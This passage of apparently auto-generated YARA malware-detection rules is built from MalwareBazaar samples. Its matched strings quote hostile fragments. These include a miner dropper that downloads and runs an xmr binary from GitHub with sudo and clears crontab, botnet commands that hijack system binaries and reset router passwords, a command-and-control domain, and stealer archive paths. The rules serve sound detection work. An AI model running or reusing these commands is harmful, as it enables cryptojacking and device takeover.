      $s12 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s13 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
      $s14 = "44Widget.MaterialComponents.NavigationRailView.Compact" fullword ascii
      $s15 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s16 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
      $s17 = "%%res/layout/test_toolbar_elevation.xml" fullword ascii
      $s18 = "GGThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Spinner" fullword ascii
      $s19 = "errorContentDescription" fullword ascii
      $s20 = "AABase.ThemeOverlay.MaterialComponents.Light.Dialog.Alert.Framework" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 25000KB and
      8 of them
}

rule sig_9b12e445e40f04928d7836b9e94f134396b889271a3e50c17efb2da71c885952 {
   meta:
      description = "evidences - file 9b12e445e40f04928d7836b9e94f134396b889271a3e50c17efb2da71c885952.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "9b12e445e40f04928d7836b9e94f134396b889271a3e50c17efb2da71c885952"
   strings:
      $s1 = "    wget https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch" fullword ascii
      $s2 = "    curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch" fullword ascii
      $s3 = "architecture=$(uname -m)" fullword ascii
      $s4 = "unalias -a" fullword ascii
      $s5 = "    sudo -n \"crontab -r\"" fullword ascii
      $s6 = "    sudo -n ./xmr_linux_$arch" fullword ascii
      $s7 = "#!/bin/bash" fullword ascii
      $s8 = "while true; do" fullword ascii
      $s9 = "    crontab -r" fullword ascii
      $s10 = "        echo \"Unsupported architecture: $architecture\"" fullword ascii
      $s11 = "case $architecture in" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule a6d1240be1ed4495684146ee78879296ff8c3409b44901d487ec533813c926c1 {
   meta:
      description = "evidences - file a6d1240be1ed4495684146ee78879296ff8c3409b44901d487ec533813c926c1.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "a6d1240be1ed4495684146ee78879296ff8c3409b44901d487ec533813c926c1"
   strings:
      $x1 = "=AAAAAAAA4QPamN3HDRQAg4COWZDwYdPHDHBdIVQZdKZO6PlNaddNzYWC4E/W1z0Qqz4erTgDDvAmLerTgD3lWdbUWq8QfmNh9c3/EfakiterTgDKNwqzSJNwoerTgDg" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */
      $s4 = "BAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* reversed goodware string 'AAAAAAAAAAAB' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                    ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                     ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s8 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                      ' */
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s11 = "N1Bt3SayIA6oraDump4T84za3xRs9HLRtaXnlqi7TQTsBX1qcr0ryq96H3RbKgerTgDllEKrYZxTe1a8wWyOUXtwzVYuBY0PK7KkYALq0W26aktRvt2ic6VnsnDenPNX" ascii
      $s12 = "eAAAAAAAAAAAAAAAAAAAAAAA8" ascii /* base64 encoded string 'x                 ' */
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string '                  ' */
      $s14 = "eAAAAAAAAAAAA" ascii /* base64 encoded string 'x        ' */
      $s15 = "fAAAAAAAAAAAA" ascii /* base64 encoded string '|        ' */
      $s16 = "ZMo25erTgDI5IlOgp3B6eyGvQZsDt9h7GMBEom22USsPc/ljlierTgDLlgbDu1D81oCdv6FHG1u0CtJmYreum2gpadrEFFP5erTgDWjku54kreGmi6bKlEAMsNPE8cnF" ascii
      $s17 = "cAAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s18 = "cAAAAAAAAAAAA" ascii /* base64 encoded string 'p        ' */
      $s19 = "777GroQcC71sbatTxANOi2kfTzWWhnMV7lEE5In2yIvV8IWZxQLBTpMkxFbh63I055KEYE7g6lcOYyJTNEveTyiEFr2xZlbj4tQhse2U3spbRRIlisobh3NTiP9ZtHgd" ascii
      $s20 = "9CQSfTDJEcMDrDQSfTCJEcMAAAAE9erTgDf/EJC6MQ8gAMw4SjOALBrroBwSFaKaAAgAEjmN0BAAAQRvAk04A5fgAk03IRCBH7DdAk03M6fg4QHAJZOmerTgDHIDEPIA" ascii
   condition:
      uint16(0) == 0x413d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule b6c59092ee6b39fcb63ded1b496f932b0bb7b5313f7e2326131cce8daf300924 {
   meta:
      description = "evidences - file b6c59092ee6b39fcb63ded1b496f932b0bb7b5313f7e2326131cce8daf300924.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "08a463d029ab76d02f269e662966195e037b5c737b62a970a3ad9d864109e825"
   strings:
      $s1 = "Wallets/PK" fullword ascii
      $s2 = "Browsers/Firefox/PK" fullword ascii
      $s3 = "Browsers/" fullword ascii
      $s4 = "Browsers/Firefox/" fullword ascii
      $s5 = "Browsers/PK" fullword ascii
      $s6 = "Wallets/" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 1KB and
      all of them
}

rule bdeb6726bcd7c19c646fd89c9a960d94547f73cc0cd4549633d04d413adb62ce {
   meta:
      description = "evidences - file bdeb6726bcd7c19c646fd89c9a960d94547f73cc0cd4549633d04d413adb62ce.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "bdeb6726bcd7c19c646fd89c9a960d94547f73cc0cd4549633d04d413adb62ce"
   strings:
      $s1 = "remcmdstub.exe" fullword ascii
      $s2 = "PCICL32.DLL" fullword ascii
      $s3 = "PCICHEK.DLL" fullword ascii
      $s4 = "TCCTL32.DLL" fullword ascii
      $s5 = "EmbeddedBrowserWebView.dll" fullword ascii
      $s6 = "HTCTL32.DLL" fullword ascii
      $s7 = "webmvorbisencoder.dll" fullword ascii
      $s8 = "webmmux.dll" fullword ascii
      $s9 = "client32.exe" fullword ascii
      $s10 = "set/vp8encoder.dll" fullword ascii
      $s11 = "set/webmmux.dll" fullword ascii
      $s12 = "inst/api-ms-win-core-localization-l1-2-0.dll" fullword ascii
      $s13 = "pcicapi.dll" fullword ascii
      $s14 = "PCICL32.DLLPK" fullword ascii
      $s15 = "HTCTL32.DLLPK" fullword ascii
      $s16 = "EmbeddedBrowserWebView.dllPK" fullword ascii
      $s17 = "PCICHEK.DLLPK" fullword ascii
      $s18 = "webmvorbisencoder.dllPK" fullword ascii
      $s19 = "TCCTL32.DLLPK" fullword ascii
      $s20 = "webmmux.dllPK" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 27000KB and
      8 of them
}

rule c4036ae358676bba732bcb78f6f2768b7076074dff7eec3a74d745dc065e58a5 {
   meta:
      description = "evidences - file c4036ae358676bba732bcb78f6f2768b7076074dff7eec3a74d745dc065e58a5.xlsx"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "1b83fc0d26ac981dd23e9766a12a428ac6458bca4725cd1a390639ddd855fbbb"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii
      $s2 = "xl/worksheets/_rels/sheet1.xml.relsUT" fullword ascii
      $s3 = "xl/_rels/workbook.xml.relsUT" fullword ascii
      $s4 = "docProps/app.xmlUT" fullword ascii
      $s5 = "docProps/core.xmlUT" fullword ascii
      $s6 = "xl/theme/theme1.xmlUT" fullword ascii
      $s7 = "xl/worksheets/sheet2.xmlUT" fullword ascii
      $s8 = "_rels/.relsUT" fullword ascii
      $s9 = "xl/worksheets/sheet1.xmlUT" fullword ascii
      $s10 = "xl/worksheets/sheet3.xmlUT" fullword ascii
      $s11 = "xl/workbook.xmlUT" fullword ascii
      $s12 = ">y|Z-PEsJSBR2[" fullword ascii
      $s13 = "xl/styles.xmlUT" fullword ascii
      $s14 = "xl/drawings/vmlDrawing1.vmlUT" fullword ascii
      $s15 = "U<Q86j" fullword ascii
      $s16 = "BqD3kJ" fullword ascii
      $s17 = "{1CGDH" fullword ascii
      $s18 = "%!r#ym" fullword ascii
      $s19 = "z*tC_T" fullword ascii
      $s20 = "[dW@%<3" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 20KB and
      8 of them
}

rule d9ce06aef3dc6211a551653d985d22916d07cf2f4f211704cc66a3b2ddbe0bb7 {
   meta:
      description = "evidences - file d9ce06aef3dc6211a551653d985d22916d07cf2f4f211704cc66a3b2ddbe0bb7.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "d9ce06aef3dc6211a551653d985d22916d07cf2f4f211704cc66a3b2ddbe0bb7"
   strings:
      $s1 = "<form action=/boaform/admin/formLogin method=POST name=\"cmlogin\">" fullword ascii
      $s2 = "  document.getElementById(\"login_safe\").style.display=\"\";" fullword ascii
      $s3 = "  document.getElementById(\"login_safe\").style.display=\"none\";" fullword ascii
      $s4 = "<!--<body leftmargin= \"0\" topmargin= \"0\" scroll= \"no\" bgcolor=\"white\" style=\"background-image: url(../image/login.gif);" ascii
      $s5 = "<META http-equiv=content-script-type content=text/javascript>" fullword ascii
      $s6 = "\"Login\" />" fullword ascii
      $s7 = "var loginFlag = 0;" fullword ascii
      $s8 = "  loginFlag = 1;" fullword ascii
      $s9 = "<table id=\"login_tb\" width=\"100%\" height=\"100%\" align=\"center\" valign=\"middle\" >" fullword ascii
      $s10 = " if (loginFlag)" fullword ascii
      $s11 = "  || document.referrer.search(\"ppp_user_X116.asp\") != -1" fullword ascii
      $s12 = "  || document.referrer.search(\"usereg.asp\") != -1)" fullword ascii
      $s13 = "<body leftmargin=\"0\" topmargin=\"0\" bgcolor=\"#ffffff\" onLoad=\"on_init();\"><img id=\"image_login\" src=\"../image/login.gi" ascii
      $s14 = "<!--<body leftmargin= \"0\" topmargin= \"0\" scroll= \"no\" bgcolor=\"white\" style=\"background-image: url(../image/login.gif);" ascii
      $s15 = "<body leftmargin=\"0\" topmargin=\"0\" bgcolor=\"#ffffff\" onLoad=\"on_init();\"><img id=\"image_login\" src=\"../image/login.gi" ascii
      $s16 = "  document.getElementById(\"user\").style.color=\"#000000\";" fullword ascii
      $s17 = "ype=\"password\" name=\"psd\" id=\"psd\" style=\"width:150;\"/></td></tr>" fullword ascii
      $s18 = "  document.getElementById(\"passwd\").style.color=\"#000000\";" fullword ascii
      $s19 = "<META http-equiv=content-type content=\"text/html; charset=utf-8\">" fullword ascii
      $s20 = " if(document.referrer.search(\"wifi_X165.asp\") != -1" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 20KB and
      8 of them
}

rule e834bf0ec5976f9df30c8c38cbc08bff8ca0ef9c39f6194ee58f5f6204d61686 {
   meta:
      description = "evidences - file e834bf0ec5976f9df30c8c38cbc08bff8ca0ef9c39f6194ee58f5f6204d61686.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "e834bf0ec5976f9df30c8c38cbc08bff8ca0ef9c39f6194ee58f5f6204d61686"
   strings:
      $s1 = "NEW PO..exe" fullword ascii
      $s2 = "* 4LRp6v" fullword ascii
      $s3 = "nqcoMnQ" fullword ascii
      $s4 = "RPTITRKV" fullword ascii
      $s5 = "-* ](l" fullword ascii
      $s6 = "#  _K." fullword ascii
      $s7 = "f6 /oM,M.-i" fullword ascii
      $s8 = "fbvNcC5" fullword ascii
      $s9 = "fSDexm1" fullword ascii
      $s10 = "@$ -lP" fullword ascii
      $s11 = "FJuULi=Z$(" fullword ascii
      $s12 = "nlfi[inL" fullword ascii
      $s13 = "tcTx?{" fullword ascii
      $s14 = "ZnBWk\\v" fullword ascii
      $s15 = "BcUiOe,d" fullword ascii
      $s16 = "mavgc/;vjg" fullword ascii
      $s17 = "iBKT1]D" fullword ascii
      $s18 = "EQDqed?" fullword ascii
      $s19 = "YDXv-UO" fullword ascii
      $s20 = "LaOvXj,c" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      8 of them
}

rule f1a24bcc3d1701e59a5c2e88560fc1fc18ddfc10ea7a6dfa201b4f6a2d9591ab {
   meta:
      description = "evidences - file f1a24bcc3d1701e59a5c2e88560fc1fc18ddfc10ea7a6dfa201b4f6a2d9591ab.pdf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "f1a24bcc3d1701e59a5c2e88560fc1fc18ddfc10ea7a6dfa201b4f6a2d9591ab"
   strings:
      $s1 = "/Title (One.com - 40337334.pdf)" fullword ascii
      $s2 = "/Contents [ 6 0 R 7 0 R 8 0 R 9 0 R 10 0 R 11 0 R 12 0 R 13 0 R 14 0 R 15 0 R ]" fullword ascii
      $s3 = "tOx.AfV" fullword ascii
      $s4 = "/Author (Helle Rasmussen)" fullword ascii
      $s5 = "/Root 1 0 R" fullword ascii
      $s6 = ".a6Av!." fullword ascii
      $s7 = ".KPcq ^3]" fullword ascii
      $s8 = "/ModDate (D:20250109155932+01'00')" fullword ascii
      $s9 = "/Size 18" fullword ascii
      $s10 = "/Length 24489" fullword ascii
      $s11 = "/Length 19592" fullword ascii
      $s12 = "/Parent 2 0 R" fullword ascii
      $s13 = "/Image1 4 0 R" fullword ascii
      $s14 = "17 0 obj" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "P40<Jjqb*Ao" fullword ascii
      $s16 = "SvhXB\"" fullword ascii
      $s17 = "/Width 1112" fullword ascii
      $s18 = "/MediaBox [ 0.0 0.0 612.0 792.0 ]" fullword ascii
      $s19 = "/Length 13029" fullword ascii
      $s20 = "/Height 61" fullword ascii
   condition:
      uint16(0) == 0x5025 and filesize < 600KB and
      8 of them
}

rule f39ed9308a0f4b59e770d651cf8955790f3a4438bbd56b4191b0bb239ed18dea {
   meta:
      description = "evidences - file f39ed9308a0f4b59e770d651cf8955790f3a4438bbd56b4191b0bb239ed18dea.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "f39ed9308a0f4b59e770d651cf8955790f3a4438bbd56b4191b0bb239ed18dea"
   strings:
      $s1 = "IMG_10503677.exe" fullword ascii
      $s2 = " /Tr0t" fullword ascii
      $s3 = "rrnA88mbqn7f" fullword ascii
      $s4 = "rynFG%qq##kooq" fullword ascii
      $s5 = "^tXoVu6FQr" fullword ascii
      $s6 = "PtMkY)S" fullword ascii
      $s7 = "PpwTS\"Fu" fullword ascii
      $s8 = "P\\*h)E" fullword ascii
      $s9 = "J}mG7z;qi" fullword ascii
      $s10 = "%@vDE\"Vf" fullword ascii
      $s11 = "R|V`*j" fullword ascii
      $s12 = "`}zAO~" fullword ascii
      $s13 = "~/U{MW3" fullword ascii
      $s14 = "o,IvN#" fullword ascii
      $s15 = "4[`YD~" fullword ascii
      $s16 = "W2GS<p" fullword ascii
      $s17 = "'@5}9;" fullword ascii
      $s18 = "(_6f!s" fullword ascii
      $s19 = "T}.>6@" fullword ascii
      $s20 = "u-oc<f7" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab_b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980_0 {
   meta:
      description = "evidences - from files 95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab.exe, b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab"
      hash2 = "b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii
      $s2 = "bVCRUNTIME140.dll" fullword ascii
      $s3 = "VCRUNTIME140.dll" fullword wide
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii
      $s5 = "Failed to execute script '%s' due to unhandled exception!" fullword ascii
      $s6 = "9python313.dll" fullword ascii
      $s7 = "bpython313.dll" fullword ascii
      $s8 = "Failed to extract %s: failed to open target file!" fullword ascii
      $s9 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide
      $s10 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide
      $s11 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide
      $s12 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide
      $s13 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide
      $s14 = "blibcrypto-3.dll" fullword ascii
      $s15 = "Failed to initialize security descriptor for temporary directory!" fullword ascii
      $s16 = "%s%c%s.exe" fullword ascii
      $s17 = "Path of ucrtbase.dll (%s) and its name exceed buffer size (%d)" fullword ascii
      $s18 = "LOADER: failed to set the TMP environment variable." fullword wide
      $s19 = "Failed to create child process!" fullword wide
      $s20 = "Failed to extract %s: decompression resulted in return code %d!" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and pe.imphash() == "a06f302f71edd380da3d5bf4a6d94ebd" and ( 8 of them )
      ) or ( all of them )
}

rule _1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed_41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953_1 {
   meta:
      description = "evidences - from files 1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed.elf, 41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5.elf, a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8.elf, b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed"
      hash2 = "41f7ed67877a3d6805d60ad5ea91816f2092012fa316f9fbf1b8fbb953fbada5"
      hash3 = "a430ed516a8a596570bc3a496b99cf6c7dd0a69ae0614ab2d2de6e9a8a6c2fc8"
      hash4 = "b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262"
   strings:
      $s1 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s2 = "rm -rf /tmp/mybin;rm -rf /tmp/mytool;mkdir /tmp/mybin;mkdir /tmp/mytool;cp -rf /bin/* /tmp/mybin/;cp /bin/busybox /tmp/mytool/mo" ascii
      $s3 = "mybin/* /usr/bin/;rm -rf /tmp/mybin;mount -t tmpfs -o size=1 tmpfs /sbin;mv /usr/bin/wget /usr/bin/init;cp /usr/bin/init /usr/bi" ascii
      $s4 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s6 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5." ascii
      $s7 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729" ascii
      $s8 = "%s -t mangle -%c POSTROUTING -p tcp --sport %d -j QUEUE" fullword ascii
      $s9 = "cnc.pinklander.com" fullword ascii
      $s10 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.UserPassword \"%s\"" fullword ascii
      $s11 = "/bin/mdm setvalues InternetGatewayDevice.X_CU_Function.Web.AdminPassword \"%s\"" fullword ascii
      $s12 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" fullword ascii
      $s13 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" fullword ascii
      $s14 = "%s -t mangle -n -L POSTROUTING > /tmp/pink/filter_ipt_check" fullword ascii
      $s15 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s16 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" fullword ascii
      $s17 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/" ascii
      $s18 = "p -rf /tmp/mybin/* /bin/;rm -rf /tmp/mybin/*;cp -rf /usr/bin/* /tmp/mybin/;mount -t tmpfs -o size=1m tmpfs /usr/bin;cp -rf /tmp/" ascii
      $s19 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
      $s20 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1" ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed_b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb3_2 {
   meta:
      description = "evidences - from files 1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed.elf, b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "1138aaff88a60f99f80f3ae2cbb8447125f9904785c47c662266ddfd5f3916ed"
      hash2 = "b4b411a4a713899565522f711036bb21c3925ee426162a870109794bb395b262"
   strings:
      $s1 = "http_downloader" fullword ascii
      $s2 = "nfq_get_payload" fullword ascii
      $s3 = "mbedtls_oid_get_extended_key_usage" fullword ascii
      $s4 = "mbedtls_md5_process" fullword ascii
      $s5 = "balloc" fullword ascii /* reversed goodware string 'collab' */
      $s6 = "mbedtls_sha1_process" fullword ascii
      $s7 = "mbedtls_sha256_process" fullword ascii
      $s8 = "mbedtls_md_process" fullword ascii
      $s9 = "mbedtls_sha512_process" fullword ascii
      $s10 = "getstringbyflag" fullword ascii
      $s11 = "cnc_exec_request_fields" fullword ascii
      $s12 = "mbedtls_cipher_auth_encrypt" fullword ascii
      $s13 = "cnc_exec_recv_fields" fullword ascii
      $s14 = "cnc_get_cncruntype" fullword ascii
      $s15 = "p2p_getport_byip" fullword ascii
      $s16 = "g_temp_protect" fullword ascii
      $s17 = "sendhttp" fullword ascii
      $s18 = "mbedtls_ecdh_compute_shared" fullword ascii
      $s19 = "mbedtls_ecdh_read_public" fullword ascii
      $s20 = "cnc_download_recv_fields" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _90b3a8c71e614f78eca406720e58dc17b8835fe26e0fe9723d04aa55b438bead_c6dbe83212aa8ff6394545049865cb36373b83c58aeec26386212c0dfc_3 {
   meta:
      description = "evidences - from files 90b3a8c71e614f78eca406720e58dc17b8835fe26e0fe9723d04aa55b438bead.unknown, c6dbe83212aa8ff6394545049865cb36373b83c58aeec26386212c0dfce439bc.unknown, e8ecc2d898ac059dc867ea95c01b93f277f311c9076c37c1d594db3830e3747d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "90b3a8c71e614f78eca406720e58dc17b8835fe26e0fe9723d04aa55b438bead"
      hash2 = "c6dbe83212aa8ff6394545049865cb36373b83c58aeec26386212c0dfce439bc"
      hash3 = "e8ecc2d898ac059dc867ea95c01b93f277f311c9076c37c1d594db3830e3747d"
   strings:
      $x1 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s2 = "minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Get Support</a></li> </ul> </div> </div>  <" ascii
      $s3 = "li> <li><a href=\"https://blog.mediafire.com/\" target=\"_blank\">Company Blog</a></li> </ul> </div> <div class=\"footerCol\"> <" ascii
      $s4 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s5 = "<meta property=\"og:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s6 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
      $s7 = "<meta property=\"twitter:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s8 = "<noscript><iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-53LP4T\"" fullword ascii
      $s9 = "en-us\" target=\"_blank\">Support</a></h2> <ul> <li class=\"minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" t" ascii
      $s10 = " style=\"margin-right:0;\"> <h2><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Support</a></h2> <ul> <li c" ascii
      $s11 = "\" width=\"180\" style=\"max-height:25px\" id=\"mf_logo_full_color_reversed\" src=\"//static.mediafire.com/images/backgrounds/he" ascii
      $s12 = "<META NAME=\"keywords\" CONTENT=\"online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, " ascii
      $s13 = "<!-- End Google Tag Manager (noscript) -->  <div id=\"statusmessage\" name=\"statusmessage\" style=\"display:none;\"> <div style" ascii
      $s14 = "et.php\" target=\"_blank\" tabindex=\"-1\">Submit a ticket</a> or <a href=\"/help/\" target=\"_blank\">visit our Help Center</a>" ascii
      $s15 = "ooterIcn\"> <a href=\"http://twitter.com/#!/mediafire\" class=\"footerIcnTw\" target=\"_blank\" rel=\"noreferrer\" title=\"Media" ascii
      $s16 = "!-- Google Tag Manager (noscript) -->" fullword ascii
      $s17 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
      $s18 = "nslate.google.com/translate_a/element.js?cb=googleTranslateElementInit';(document.getElementsByTagName('head')[0]||document.getE" ascii
      $s19 = "<!-- MSIE 10 -->" fullword ascii
      $s20 = "/templates/upgrade/upgrade_button.php\" frameborder=\"0\" scrolling=\"no\" title=\"Upgrade\"></iframe> <div id=\"secondaryHeader" ascii
   condition:
      ( uint16(0) == 0x3c20 and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab_aa8f8a3e268493157e62d93ab9cafb94573606fe43a80e63e3e4f2e5c9_4 {
   meta:
